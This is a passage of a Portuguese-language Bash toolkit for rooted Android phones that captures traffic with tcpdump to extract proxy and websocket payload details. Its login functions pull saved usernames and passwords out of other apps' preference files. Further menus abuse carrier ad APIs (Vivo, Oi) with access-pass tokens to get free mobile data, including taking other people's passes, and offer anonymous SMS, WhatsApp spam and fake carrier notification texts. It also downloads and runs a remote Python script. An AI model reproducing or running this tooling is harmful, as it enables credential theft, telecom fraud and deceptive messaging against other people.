echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
echo 
echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"

echo
echo -e "${DESTACAR}PAYLOAD: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"

echo
read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; PegarinfoWSDirect1;;
  Y)cat sniffer.txt ; PegarinfoWSDirect1;;
  *)Verlogin2;;
  esac
}
PegarinfoWSDirect1(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoWSDirect2;;
  Y)PegarinfoWSDirect2;;
  *)Verlogin2;;
  esac
}
PegarinfoWSDirect2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoWSDirect3
}
PegarinfoWSDirect3(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoWSDirect2;;
  Y)PegarinfoWSDirect2;;
  *)Verlogin2;;
  esac
}
Verlogin2(){
echo
read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
  case $optione1 in
  N)X9sniffer;;
  n)X9sniffer;;
  y)logindirect;;
  Y)logindirect;;
  *)X9sniffer;;
  esac
}
logindirect(){
su -c rm -f login.xml
clear
echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
read App
echo ""

su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml

User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)

Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)

clear

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
echo -e "${GREEN}$P3${SCOLOR}"
echo 
echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
echo -e "${GREEN}Usuario: $User${SCOLOR}"
echo -e "${GREEN}Senha: $Pass${SCOLOR}"
echo
echo -e "${DESTACAR}PAYLOAD: ${NADA}"
echo
echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
echo

 read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}






wspayssl(){
clear
GREEN='\033[1;32m'
SCOLOR='\033[0m'
clear
Sniffer2
}
Sniffer2(){
clear
echo -e "NECESSARIO DESATIVAR A OPÇÃO ${GREEN}SSL${SCOLOR}, DEIXAR"
echo -e "APENAS ${GREEN}PAYLOAD${SCOLOR} ATIVADO E INICIAR A CONEXÃO"
echo 
read -n1 -p "DIGITE Y DEPOIS DE TER FEITO TUDO ISSO" optione12
  case $optione12 in 
  y)Xaringan;;
  Y)Xaringan;;
   *)Sniffer2;;
  esac
  }
Xaringan(){
clear
su -c rm -f hostcreate.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
clear

echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}"

echo 

su -c tcpdump -i any -n -c25 -w sniffer.txt

Proxys=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f5)
echo -e "$Proxys" >> proxys.txt
 
clear
HostCreate=$(cat sniffer.txt | grep -a Host)
echo -e "$HostCreate" >> hostcreate.txt
P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7) 
P3=$(cat sniffer.txt | grep -a Upgrade)
Proxy=$(cat sniffer.txt | grep -a 104 | cut -d':' -f1 | cut -d' ' -f2)
Porta=$(cat sniffer.txt | grep -a 104 | cut -d':' -f2 | cut -d' ' -f1)
P6=$(cat sniffer.txt | grep -a Host | cut -d' ' -f2)
P22=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7)

check2() {
    P13=$(cat sniffer.txt | grep -c websocket -i)
    case $P13 in
    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac;;
    1) clear;;
     esac
}
check2

echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
echo 
echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
echo -e "${GREEN}SNI: $P6${SCOLOR}"
echo

read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; PegarinfoPaySSL1;;
  Y)cat sniffer.txt ; PegarinfoPaySSL1;;
  *)Verlogin3;;
  esac
}
PegarinfoPaySSL1(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoPaySSL2;;
  Y)PegarinfoPaySSL2;;
  *)Verlogin3;;
  esac
}
PegarinfoPaySSL2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoPaySSL3
}
PegarinfoPaySSL3(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoPaySSL2;;
  Y)PegarinfoPaySSL2;;
  *)Verlogin3;;
  esac
}
Verlogin3(){
echo
read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
  case $optione1 in
  N)X9sniffer;;
  n)X9sniffer;;
  y)login;;
  Y)login;;
  *)X9sniffer;;
  esac
}
login(){
su -c rm -f login.xml
clear
echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
read App
echo ""

su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml

User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)

Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)

clear

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
echo 
echo -e "${GREEN}Proxy: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
echo -e "${GREEN}Usuario: $User${SCOLOR}"
echo -e "${GREEN}Senha: $Pass${SCOLOR}"
echo
echo -e "${GREEN}SNI: $P6${SCOLOR}"
echo
echo -e "${DESTACAR}PAYLOAD: ${NADA}"
echo
echo -e "${GREEN}GET / HTTP/1.1[crlf]$P22[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}





direct(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
clear
Sniffer3
  }
Sniffer3(){
clear
check7() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
    0) clear;;
     esac
}
check7
clear
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f directproxy.txt
clear
su -c rm -f hostdirect.txt
su -c rm -f directpay.txt
su -c rm -f directport.txt
clear
su -c rm -f directproxycreate.txt
clear
echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
echo
read -p "ESCOLHA UMA PORTA: " Porta

clear

echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"

sniff=$(su -c tcpdump -c10 -n -A port ${Porta} -vv) && echo -e "$sniff" >> sniffer.txt

HostDir=$(cat sniffer.txt | grep -a Host | cut -d' ' -f2 | grep -a .) && echo -e "$HostDir" >> hostdirect.txt

adr=$(cat hostdirect.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-9)

payloaddd=$(cat sniffer.txt | grep -a "$adr") && echo -e "$payloaddd" >> directpay.txt

directproto=$(cat directpay.txt | grep -a -n "$adr" | cut -d':' -f2-7)

directhost=$(cat directpay.txt | grep -a -n "$adr" | grep -a 2: | cut -d':' -f2-7 | cut -d'	'  -f2)

directproxycreate1=$(cat sniffer.txt | grep -a ">" | cut -d'>' -f2 | cut -d'.' -f1-5 | cut -d':' -f1) && echo -e "$directproxycreate1" >> directproxycreate.txt

directproxycreate2=$(cat directproxycreate.txt | grep -a -n . | grep 1: | cut -d':' -f2) && echo -e "$directproxycreate2" >> directproxy.txt

directproxy=$(cat directproxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4 | grep -a -n . | grep -a 1: | cut -d':' -f2)

directport=$(cat directproxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5)

clear
check2() {
    P13=$(cat sniffer.txt | grep -c $directhost)
    case $P13 in
    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac;;
    1) clear;;
     esac
}
check2
clear
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo
echo -e "${GREEN}$directproto${SCOLOR}"
echo 
echo -e "${GREEN}Servidor:$directproxy${SCOLOR}"
echo -e "${GREEN}Porta: $directport${SCOLOR}"
echo
read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; PegarinfoDirect;;
  Y)cat sniffer.txt ; PegarinfoDirect;;
  *)Voltar;;
  esac
}
PegarinfoDirect(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoDirect2;;
  Y)PegarinfoDirect2;;
  *)Voltar;;
  esac
}
PegarinfoDirect2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoDirect3
}
PegarinfoDirect3(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoDirect2;;
  Y)PegarinfoDirect2;;
  *)Voltar;;
  esac
}
Voltar(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}





V2Ray(){
clear
check7() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
    0) clear;;
     esac
}
check7

echo -e "${DESTACAR}1 - Sniffar porta 80${NADA}"
echo -e "${DESTACAR}2 - Sniffar porta 443${NADA}"
echo -e "${DESTACAR}3 - Escolher porta${NADA}"
echo
read -n1 -p "Escolha uma Opção: " PortaV2
case $PortaV2 in
1)Portv2="80";;
2)V2Ray443;;
3)echo ; read -p "Digite a porta: " Portv2;;
*)V2Ray;;
esac

clear
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxycreator.txt
su -c rm -f hostcreate.txt
clear
echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"

Sniff=$(su -c tcpdump -c80 -n -A port ${Portv2})
echo -e "$Sniff" >> sniffer.txt

Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f3 | grep -a 104)
echo -e "$Proxycreator" >> proxycreator.txt

clear
Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
echo -e "$Proxys" >> proxys.txt

HostCreate=$(cat sniffer.txt | grep -a Host)
echo -e "$HostCreate" >> hostcreate.txt

P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
P3=$(cat sniffer.txt | grep -a Upgrade)
Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)

 

check2() {
    P13=$(cat sniffer.txt | grep -a -c 104)
    case $P13 in
    0) echo "NADA ENCONTRADO" ; sleep 4 ; X9sniffer;;
    1) clear;;
     esac
}
check2
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo
echo -e "${GREEN}$P2${SCOLOR}"
echo
echo -e "${GREEN}Address: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; Pegarinfo;;
  Y)cat sniffer.txt ; Pegarinfo;;
  *)Voltar;;
  esac
}
Pegarinfo(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2;;
  Y)Pegarinfo2;;
  *)Voltar;;
  esac
}
Pegarinfo2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoRev
}
PegarinfoRev(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2;;
  Y)Pegarinfo2;;
  *)Voltar;;
  esac
}
Voltar(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}



V2Ray443(){
clear
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxycreator.txt
su -c rm -f hostcreate.txt
clear
echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"

Sniff=$(su -c tcpdump -c80 -n -A port 443)
echo -e "$Sniff" >> sniffer.txt

Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f3 | grep -a 104)
echo -e "$Proxycreator" >> proxycreator.txt

clear
Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
echo -e "$Proxys" >> proxys.txt

HostCreate=$(cat sniffer.txt | grep -a Host)
echo -e "$HostCreate" >> hostcreate.txt

P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
P3=$(cat sniffer.txt | grep -a Upgrade)
Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)

 

check2() {
    P13=$(cat sniffer.txt | grep -c 104)
    case $P13 in
    0) echo "NADA ENCONTRADO" ; sleep 4 ; X9sniffer;;
    1) clear;;
     esac
}
check2
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo
echo -e "${GREEN}Address: $Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; Pegarinfo;;
  Y)cat sniffer.txt ; Pegarinfo;;
  *)Voltar;;
  esac
}
Pegarinfo(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2;;
  Y)Pegarinfo2;;
  *)Voltar;;
  esac
}
Pegarinfo2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoRev
}
PegarinfoRev(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2;;
  Y)Pegarinfo2;;
  *)Voltar;;
  esac
}
Voltar(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}




SniffarAll(){
clear
check7() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
    0) clear;;
     esac
}
check7
clear

echo -e "${DESTACAR}1 - Escolher Porta${NADA}"
echo -e "${DESTACAR}2 - Todas as Portas${NADA}"
echo
read -n1 -p "Escolha uma Opção: " ComSemPorta
case $ComSemPorta in
1)ComPortaAll;;
2)TodasPortasAll;;
*)SniffarAll;;
esac
}

ComPortaAll(){
clear
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxy.txt
clear
echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
echo
read -p "ESCOLHA UMA PORTA: " Porta

clear

echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo -e "${DESTACAR}PARA PARAR DIGITE${NADA} ${GREEN}CTRL+C${NADA}"

Sniff=$(su -c tcpdump -c10000 port ${Porta} -n -A)
echo -e "$Sniff" >> sniffer.txt
cat sniffer.txt


PegarinfoAll
}
PegarinfoAll(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoAll2;;
  Y)PegarinfoAll2;;
  *)Voltar;;
  esac
}
PegarinfoAll2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoAll3
}
PegarinfoAll3(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoAll2;;
  Y)PegarinfoAll2;;
  *)Voltar;;
  esac
}
Voltar(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}


TodasPortasAll(){
clear
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxy.txt

clear

echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo -e "${DESTACAR}PARA PARAR DIGITE${NADA} ${GREEN}CTRL+C${NADA}"

Sniff=$(su -c tcpdump -c10000 -A)
echo -e "$Sniff" >> sniffer.txt
cat sniffer.txt


Pegarinfo2All
}
Pegarinfo2All(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2All2;;
  Y)Pegarinfo2All2;;
  *)Voltar;;
  esac
}
Pegarinfo2All2(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
Pegarinfo2All3
}
Pegarinfo2All3(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)Pegarinfo2All2;;
  Y)Pegarinfo2All2;;
  *)Voltar;;
  esac
}
Voltar(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}












Main5(){
clear
echo -e '\n'
echo "     ==================================="
echo "                    MBS FREE     "
echo "         ===================================" 
echo "                ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "              ${DESTACAR}[ 1 ] - Vivo"
echo -e "              [ 2 ] - Oi"
echo -e "              [ 3 ] - MBs Free Python"
echo -e "              [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo 
echo "@alpacinoo007"
echo "@luanw04"
echo
read -n1 -p "ESCOLHA UMA OPÇÃO: " TokensNews01
case $TokensNews01 in

1)
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
OPERADORA="VIVO"
BANNER="${NADA}============================================${NADA}\n${LETRAPRETA}                  MBS $OPERADORA                  ${NADA}\n============================================${DESTACAR}"

Repet1r="999"
UrlAds="http://e.vivo.ddivulga.com/api/v2.1/fetch"
UrlOrigin="http://navegue.vivo.com.br"
UrlClick="http://e.vivo.ddivulga.com/api/clickEvent"
UrlReferer="internetgratis.vivo.com.br"
UrlResponse="http://e.vivo.ddivulga.com/api/leadConversionEvent"
UrlPass="i.vivo.ddivulga.com/i/gp"
UrlVideo="http://e.vivo.ddivulga.com/api/videoActionEvent"
UrlVIdeo2="http://e.vivo.ddivulga.com/api/videoConversionEvent"
OPERADORA="VIVO"
UrlNumero="http://e.vivo.ddivulga.com/api/getMsisdn"
PageID="660224"
Vizes="999"
Mensege1="AGUARDE ALGUMAS HORAS E ESCOLHA OUTRO ADS"
Esperar1="1.8"
Aguardar1="AGUARDE ALGUMAS HORAS"

Mensagens1="Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede. ligue no 1058
Informe Vivo: Essa linha foi cancelada por uso indevido conforme regulamento em nossa Rede. ligue no 1058
Voce ganhou 1GB de internet para usar em 30 dias ou ate consumir 100%. Em ate 1 hora o pacote estara ativo.
Voce ganhou 10GB de internet para usar em 30 dia ou ate consumir 100%. Em ate 1 hora o pacote estara ativo.
Voce ganhou 5GB de internet para usar em 30 dias ou ate consumir 100%. Em ate 1 hora o pacote estara ativo.
Informe Vivo: Essa linha está sobre analise, caso seja detectado algum uso indevido ela será bloqueada. ligue no 1058
Informe Vivo: Esse IMEI está sobre analise, caso seja detectado algum uso indevido ele será bloqueado. ligue no 1058
Voce recarregou R$100 validos por 45 dias. Envie SMS p/8000 e receba seu saldo.
Voce recarregou R$150 validos por 60 dias. Envie SMS p/8000 e receba seu saldo."

Menu5
;;


2)
Repet1r="9999"
UrlAds="http://e.oi.ddivulga.com/api/v2.1/fetch" 
UrlOrigin="http://e.oi.ddivulga.com"
UrlClick="http://e.oi.ddivulga.com/api/clickEvent"
UrlReferer="oi.ddivulga.com"
UrlResponse="http://e.oi.ddivulga.com/api/leadConversionEvent"
UrlPass="e.oi.ddivulga.com/api/gp"
UrlVideo="http://e.oi.ddivulga.com/api/videoActionEvent"
UrlVIdeo2="http://e.oi.ddivulga.com/api/videoConversionEvent"
OPERADORA="OI  "

BANNER="${NADA}============================================${NADA}\n${LETRAPRETA}                  MBS $OPERADORA                  ${NADA}\n============================================${DESTACAR}"

PageID="822068"
Vizes="9999"
Mensege1="ESCOLHA OUTRO TOKEN"
Esperar1="0"
Aguardar1="ESCOLHA OUTRO TOKEN"

Mensagens1="Informe Oi: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede
Informe Vivo: Essa linha foi cancelada por uso indevido conforme regulamento em nossa Rede
Voce ganhou um pacote de dados de 5.0 GB. Se ainda nao usou, aproveite e navegue agora
Voce ganhou um pacote de dados de 1.0 GB. Se ainda nao usou, aproveite e navegue agora
Voce ganhou um pacote de dados de 10.0 GB. Se ainda nao usou, aproveite e navegue agora
Informe Oi: Essa linha está sobre analise, caso seja detectado algum uso indevido ela será bloqueada
Informe Oi: Esse IMEI está sobre analise, caso seja detectado algum uso indevido ele será bloqueado
Voce recarregou R$100 validos por 45 dias
Voce recarregou R$150 validos por 45 dias"


Menu5
;;

3)clear
echo -e "============================================${NADA}\n${LETRAPRETA}                  MBS FREE                  ${NADA}\n============================================${NADA}"
echo -e "1 - INICIAR MBS PYTHON"
echo -e "2 - INSTALAR MBS PYTHON"
echo -e "0 - VOLTAR"
echo
read -p "Escolha uma Opção: " option
case $option in 
1)python3 force.py;;
2);;
0)Menu5;;
esac

echo
echo
echo -e "${DESTACAR}LIGUE A INTERNET${NADA}"
echo
read -n1 -p "DIGITE Y DEPOIS DE LIGAR" optione12
case $optione12 in 

y|Y)echo ; echo ; pkg install python -y; pkg install python3 -y; pip3 install requests; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/force.py && chmod +x force.py && cp force.py $PREFIX/bin/  ; echo -e "${GREEN}SCRIPT BAIXADO COM SUCESSO${NADA}"; sleep 5 ;python3 force.py;;
  *)Menu5;;
  esac

;;

0)MenuPrincipal;;
*)Main5;;
esac
}


Menu5(){
clear
echo -e '\n'
echo "     ==================================="
echo "                    MBS $OPERADORA     "
echo "         ===================================" 
echo "                ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "              ${DESTACAR}[ 1 ] - Procurar Pass"
echo -e "              [ 2 ] - Usar Pass Personalizado"
echo -e "              [ 3 ] - Usar Pass Salvos"
echo -e "              [ 4 ] - Pegar Pass de Outras Pessoas"
echo -e "              [ 5 ] - SMS Anônimo"
echo -e "              [ 6 ] - Whatsapp Spam"
echo -e "              [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo 
echo "@alpacinoo007"
echo "@luanw04"
echo
read -n1 -p "ESCOLHA UMA OPÇÃO: " TokensNews01
case $TokensNews01 in
1)ProcurarAPass ;;
2)chavecustom ;;
3)PassSalvos0;;
4)ComoPegarOPass;;
5)SmsA;;
6)WppSpam;;
0)Main5;;
*)Menu5;;
esac
}

ProcurarAPass(){
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'


echo -e "${BANNER}"





for i in $(seq 3)
do
case $i in
1)gucci="DESLIGUE O WI-FI, PARE A VPN E LIGUE OS DADOS";;
2)gucci="MOVEIS PARA O SCRIPT GERAR O PASS E CAPTURAR OS";;
3)gucci="TOKENS DE ADS QUE ESTÃO ATIVOS NA SUA LINHA";;
esac

opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.02
done
echo
done

sleep 4
echo

echo

Xta="DIGITE ENTER DEPOIS DE TER FEITO TUDO"

gucci="$Xta"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.02
done

 read Option005
 
 

AccessPass=$(curl -s -d "version=2" $UrlPass -H "Origin: $UrlOrigin" | cut -d'"' -f4)




clear
echo -e "${BANNER}"

gucci="JÁ PODE SE CONECTAR EM VPNS OU WIFI SE QUISER"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${gucci:$b:1}" 
sleep 0.02
done

echo
echo
gucci="APERTE QUALQUER TECLA APÓS SE CONECTAR"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.02
done

read -n1 conectadoain
Buscartokens
}

chavecustom(){
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

gucci="COLE O PASS: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.03
done

echo -ne "${GREEN}"
read AccessPass
echo -ne "${NADA}"

echo
SalvarPass
}

SalvarPass(){
clear
echo -e "${BANNER}"

gucci="QUER SALVAR ESSE PASS? [Y/n] "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${gucci:$b:1}" 
sleep 0.03
done

read -n1 AccessPassSave

echo
echo
case $AccessPassSave in
n)Buscartokens;;
N)Buscartokens;;
Y|y)gucci="DIGITE UM NOME PARA O PASS: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${gucci:$b:1}" 
sleep 0.03
done
read PassName
echo -e " ${GREEN} $PassName${NADA}- $OPERADORA -$AccessPass" >> TokensSave.txt ; Buscartokens;;
*)SalvarPass;;
esac
}








Buscartokens(){
rm -f PegarTelefone.txt

h="8"
i="9"
z="0"

NumeroDeTel12=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A110%2C%22target%22%3A%22%22%7D%5D&pageId=$PageID&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2F$UrlReferer%2F&accessPass=$AccessPass" $UrlAds -H "Origin: $UrlOrigin")

echo -e "$NumeroDeTel12" >> PegarTelefone.txt

a="1"
b="2"
c="3"

NumeroDeTelefone=$(cat PegarTelefone.txt | grep -o msisdn.................................... | cut -d '"' -f3 | grep -n 55 | grep 1: | cut -d':' -f2)

PassCheck=$(cat PegarTelefone.txt | grep -o msisdn)

PassVencido=$(echo "$PassCheck" | grep -c 'msisdn')

d="4"
e="5"
f="6"
g="7"
case $PassVencido in
0) clear
echo -e "${BANNER}"
gucci="ESSE PASS ESTÁ VENCIDO OU É INVALIDO"

opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${RED}${gucci:$b:1}${NADA}" 
